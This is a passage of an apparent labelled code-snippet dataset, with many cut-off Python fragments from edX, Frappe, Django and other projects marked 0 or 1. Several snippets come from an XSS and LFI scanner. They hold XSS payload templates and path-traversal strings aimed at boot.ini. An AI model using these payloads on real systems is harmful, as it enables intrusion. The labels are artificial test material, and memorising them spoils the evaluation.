fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self", "label": 0}, {"snippet_id": 19376, "code": " test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using", "label": 0}, {"snippet_id": 50641, "code": " a django-specific internal representation of the browser session. \"\"\" if self.csessid: return _CLIENT_SESSIONS(session_key=self.csessid) def disconnect(self, reason=\"Server disconnected.\"): \"\"\" Disconnect", "label": 0}, {"snippet_id": 49022, "code": "()) ) class SmartListItem(object): def __init__(self, smart_list, object): self.smart_list=smart_list self.object=object def fields(self): return[ SmartListField(self, column, self.object) for column in", "label": 0}, {"snippet_id": 24367, "code": " use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss", "label": 0}, {"snippet_id": 5271, "code": " 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset", "label": 0}, {"snippet_id": 4368, "code": " img(self): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self", "label": 1}, {"snippet_id": 13849, "code": "+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware", "label": 0}, {"snippet_id": 28489, "code": ".get('alerting')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/checker-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('metrics')==1: \t\tmess=get_data('date_in_log') +action +\"", "label": 0}, {"snippet_id": 15760, "code": "/ self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE", "label": 0}, {"snippet_id": 48775, "code": " import BooleanField, ForeignKey from django.utils.formats import localize from django.utils.html import format_html, escape from django.utils.http import urlencode from django.utils.translation import", "label": 0}, {"snippet_id": 47927, "code": "('password mismatch') auth_user: User=User.objects.create_user(username=username, email=mail, password=pw1) auth_user.save() user: Profile=Profile() user.rights=rights user.number_of_allowed_reservations", "label": 1}, {"snippet_id": 22613, "code": "?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses", "label": 0}, {"snippet_id": 19231, "code": "._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)", "label": 0}, {"snippet_id": 13406, "code": "/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES", "label": 0}, {"snippet_id": 12909, "code": " +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=(", "label": 0}, {"snippet_id": 33828, "code": " \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from", "label": 0}, {"snippet_id": 39089, "code": "'Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td", "label": 0}, {"snippet_id": 16243, "code": ".password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls'", "label": 0}, {"snippet_id": 39456, "code": "]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t", "label": 0}, {"snippet_id": 54753, "code": " False class ArticleFormView(LoginRequiredMixin, FormView): \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article template_name='post.html' context_object_name='articles' form_class=ArticleForm success_url='/' def get_context_data", "label": 0}, {"snippet_id": 6527, "code": " MongoDB documentation for details. If not set, an in-memory SSO session cache will be used. \"\"\" return self.config.get(self.section, 'sso_session_mongo_uri') @property def raven_dsn(self): \"\"\" Raven DSN", "label": 0}, {"snippet_id": 29241, "code": "\"fullpath\": \t\tfull_path=path \t \ttry: \t\tssh=ssh_connect(serv) \texcept Exception as e: \t\terror=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp() \t\tfile=sftp.put(file, full_path) \t\tsftp.close() \t\tssh.close() \texcept Exception", "label": 0}, {"snippet_id": 12659, "code": "/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab", "label": 0}, {"snippet_id": 4010, "code": " '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='", "label": 0}, {"snippet_id": 10402, "code": ".verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"", "label": 0}, {"snippet_id": 22410, "code": " kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile", "label": 0}, {"snippet_id": 2308, "code": "(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger", "label": 0}, {"snippet_id": 22481, "code": "), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press", "label": 0}, {"snippet_id": 27193, "code": "\\w\\/\\.\\-\\ m_reqtype =re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if", "label": 1}, {"snippet_id": 46252, "code": " browse(request, name, is_mobile=False): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections and engine=='solr': return no_collections(request", "label": 0}, {"snippet_id": 13881, "code": "/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name", "label": 0}, {"snippet_id": 18631, "code": "\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 21525, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 39834, "code": "\t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from", "label": 0}, {"snippet_id": 47101, "code": "('JSON'), ) column_formatters=dict( version_id=lambda v, c, m, p: m.version_id-1, json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format( json.dumps(m.json, indent=2, sort_keys=True))) ) column_filters", "label": 1}, {"snippet_id": 8975, "code": "+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license", "label": 0}, {"snippet_id": 20161, "code": ".coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course", "label": 0}, {"snippet_id": 49657, "code": " which returns html -label for the column(string) \"\"\" if not self.list_display: return[SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)] columns=[] for index,", "label": 0}, {"snippet_id": 51176, "code": "(PeriodicTask, IEPeriodicTaskAdmin) admin.site.register(CrontabSchedule, IECrontabSchedule) class DashboardUserInline(admin.StackedInline): model=DashboardUser can_delete=False verbose_name_plural='Dashboard", "label": 0}, {"snippet_id": 15816, "code": " Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get", "label": 0}, {"snippet_id": 28652, "code": "=os.environ.get(\"SCRIPT_NAME\") \tsql.delete_old_uuid() \t \tif user_uuid is not None: \t\tsql.update_last_act_user(user_uuid.value) \t\tif sql.get_user_name_by_uuid(user_uuid.value) is None: \t\t\tprint('<meta http", "label": 0}, {"snippet_id": 49469, "code": " values=[] if isinstance(self.model_field, SmartListFilter): values=[ SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self.model_field.lookups() ", "label": 0}, {"snippet_id": 46473, "code": "]=_('There is no collection to search.') return JsonResponse(response) def no_collections(request): return render('no_collections.mako', request,{'is_embeddable': request.GET.get('is_embeddable', False", "label": 0}, {"snippet_id": 37330, "code": " has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\",", "label": 0}, {"snippet_id": 33947, "code": "(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content", "label": 0}, {"snippet_id": 18893, "code": "'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login", "label": 0}, {"snippet_id": 53355, "code": "(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2'", "label": 0}, {"snippet_id": 33611, "code": "\t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content", "label": 0}, {"snippet_id": 51005, "code": " makes it very hazy when something will run. Because of this, we'll move to the horrifically designed absolute nightmare format Crontab. Crontab would be half-great if the parameters where named. Get your", "label": 0}, {"snippet_id": 9864, "code": "'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$", "label": 0}, {"snippet_id": 23806, "code": "._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name", "label": 0}, {"snippet_id": 727, "code": ".scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=", "label": 1}, {"snippet_id": 39248, "code": "\"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self", "label": 0}, {"snippet_id": 8642, "code": ", url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django", "label": 0}, {"snippet_id": 10338, "code": " expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self", "label": 0}, {"snippet_id": 32670, "code": "=extensions, extension_configs=extension_configs, tab_length=2, output_format='html4') has_a_single_h1=(len([line for line in contents.splitlines() if(line.startswith(' not line.startswith(' md.treeprocessors[", "label": 0}, {"snippet_id": 16147, "code": ", url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user", "label": 0}, {"snippet_id": 24953, "code": ": self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports", "label": 0}, {"snippet_id": 2823, "code": ") result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[", "label": 0}, {"snippet_id": 23560, "code": ".view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS')", "label": 0}, {"snippet_id": 35925, "code": " value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif", "label": 0}, {"snippet_id": 29050, "code": "\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+ \t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error:", "label": 0}, {"snippet_id": 13779, "code": ".html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses", "label": 1}, {"snippet_id": 14915, "code": ".shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string", "label": 0}, {"snippet_id": 43272, "code": " \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t", "label": 0}, {"snippet_id": 25309, "code": " final_attrs=self.build_attrs(attrs or dict()) if 'required' in final_attrs: del final_attrs['required'] id_=final_attrs.get('id', None) for i, widget in enumerate(self.widgets): try: widget_value=value", "label": 0}, {"snippet_id": 5386, "code": "'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste', 'onbeforescriptexecute', 'onbeforeunload', 'onbegin', 'onblur', 'oncanplay', 'oncanplaythrough', ", "label": 0}, {"snippet_id": 10232, "code": " name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override:", "label": 1}, {"snippet_id": 54153, "code": ": ki().start() main=Tk() main.title(\"XSS Sonar\") main.configure(background='light sky blue') Label(main, text=\"Target:\",background='light sky blue').grid(row=0) Label(main, text=\"Cookie:(Optional)\",background", "label": 0}, {"snippet_id": 35473, "code": ".get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in", "label": 0}, {"snippet_id": 31963, "code": "'ldap_server') \tport=sql.get_setting('ldap_port') \tuser=sql.get_setting('ldap_user') \tpassword=sql.get_setting('ldap_password') \tldap_base=sql.get_setting('ldap_base') \tdomain=sql.get_setting('ldap_domain') ", "label": 0}, {"snippet_id": 26059, "code": ".invoice_address_vatid: del self.fields['vat_id'] if not event.settings.invoice_address_required or self.all_optional: for k, f in self.fields.items(): f.required=False f.widget.is_required=False if 'required' in f.widget", "label": 0}, {"snippet_id": 11407, "code": "...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"", "label": 0}, {"snippet_id": 1342, "code": " ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers", "label": 0}, {"snippet_id": 26411, "code": "')) else: self.instance.vat_id_validated=False class BaseInvoiceNameForm(BaseInvoiceAddressForm): def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) for f in list(self.fields.keys()", "label": 0}, {"snippet_id": 52012, "code": " Document, Document2 from liboozie.credentials import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie.decorators import check_document_access_permission", "label": 0}, {"snippet_id": 6081, "code": " 'default_language': 'en', 'base_url': None, 'default_eppn_scope': None, 'authn_info_mongo_uri': None, 'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None, ", "label": 0}, {"snippet_id": 46843, "code": ".save(*args, **kwargs) @property async def content(self): rv=await self.get_props_by_key('content') if rv: return rv.decode('utf-8') @property async def html_content(self): content=await self.content if", "label": 1}, {"snippet_id": 16259, "code": " settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id'", "label": 0}, {"snippet_id": 34810, "code": " \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns", "label": 0}, {"snippet_id": 50685, "code": "(self.csessid) self.sessionhandler.disconnect(self) def at_login(self): csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=self.uid csession.save() def data_out(self, *", "label": 0}, {"snippet_id": 36826, "code": " \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren", "label": 0}, {"snippet_id": 50478, "code": " return server.NOT_DONE_YET def mode_close(self, request): \"\"\" This is called by render_POST when the client is signalling that it is about to be closed. Args: request(Request): Incoming request. \"\"\" csessid", "label": 0}, {"snippet_id": 50085, "code": "): \"callback if a request is lost/timed out\" try: del self.requests[csessid] except KeyError: pass def _keepalive(self): \"\"\" Callback for checking the connection is still alive. \"\"\" now=time.time() to_remove", "label": 0}, {"snippet_id": 17074, "code": "', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 24196, "code": " test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call", "label": 0}, {"snippet_id": 30341, "code": "') \texcept requests.exceptions.ReadTimeout: \t\tprint('Oops. Read timeout occured') \texcept requests.exceptions.HTTPError as errh: \t\tprint(\"Http Error:\",errh) \texcept requests.exceptions.ConnectionError as", "label": 0}, {"snippet_id": 11726, "code": "\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX", "label": 0}, {"snippet_id": 23446, "code": "'AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity'", "label": 0}, {"snippet_id": 30401, "code": ")) if serv is not None and form.getvalue('rows') is not None: \trows=form.getvalue('rows') \twaf=form.getvalue('waf') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut')", "label": 0}, {"snippet_id": 36782, "code": ".comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", ", "label": 0}, {"snippet_id": 30250, "code": ".getvalue('s'), \t\t'b': form.getvalue('b') \t} \theaders={ \t\t'User-Agent': 'Mozilla/5.0(Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0', \t\t'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/", "label": 0}, {"snippet_id": 26667, "code": "/boot.ini', '../../../../../../../boot.ini', '../../../../../../../../boot.ini', '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',", "label": 0}, {"snippet_id": 1136, "code": "!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid", "label": 1}, {"snippet_id": 24248, "code": " import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib", "label": 0}, {"snippet_id": 28764, "code": " sys \t\tsys.exit() \t\t\t\t def ssh_connect(serv, **kwargs): \timport paramiko \tfrom paramiko import SSHClient \timport sql \tfullpath=get_config_var('main', 'fullpath') \tssh_enable='' \tssh_port='' \tssh_user_name", "label": 0}, {"snippet_id": 11084, "code": " if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data", "label": 0}, {"snippet_id": 22416, "code": ")university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views", "label": 0}, {"snippet_id": 37833, "code": " clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator", "label": 1}, {"snippet_id": 27150, "code": ".match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I) if m_input: m_value=re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I) if m_value: hidden_param_name.append(m_input", "label": 1}, {"snippet_id": 579, "code": " impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list", "label": 1}, {"snippet_id": 10143, "code": "'', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite(", "label": 0}, {"snippet_id": 34775, "code": "\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in", "label": 0}, {"snippet_id": 262, "code": " import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list", "label": 0}, {"snippet_id": 20607, "code": " or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index',", "label": 0}, {"snippet_id": 10287, "code": " for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard", "label": 0}, {"snippet_id": 292, "code": "' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain", "label": 1}, {"snippet_id": 12517, "code": "', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 13165, "code": "]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset", "label": 0}, {"snippet_id": 29366, "code": " sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands.extend(open_port_firewalld(cfg)) \t \terror +=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry:", "label": 0}, {"snippet_id": 8346, "code": "), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log')", "label": 0}, {"snippet_id": 51740, "code": " _('\ud83d\udd52 Periodic Tasks'), 'items':[ {'name': 'app.job'}, {'name': 'django_celery_beat.periodictask'}, {'name': 'django_celery_beat.crontabschedule'}, ]}, ] MEDIA_ROOT=os.environ.get('MEDIA_ROOT', os.path", "label": 0}, {"snippet_id": 19555, "code": " functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite", "label": 0}, {"snippet_id": 27020, "code": " +\"/\" +page print \"[+] LFI check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for lfi in lfi_attacks: post_params={} counter+=1 parameters", "label": 0}, {"snippet_id": 6270, "code": "') if not res: res=None return res @property def debug(self): \"\"\" Set to True to log debug messages(boolean). \"\"\" return self.config.getboolean(self.section, 'debug') @property def syslog_debug(self): ", "label": 0}, {"snippet_id": 18303, "code": ".pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\")", "label": 1}, {"snippet_id": 24064, "code": " ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self)", "label": 0}, {"snippet_id": 22078, "code": "\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):", "label": 0}, {"snippet_id": 36169, "code": "(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname]", "label": 0}, {"snippet_id": 45136, "code": ".get('coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials", "label": 0}, {"snippet_id": 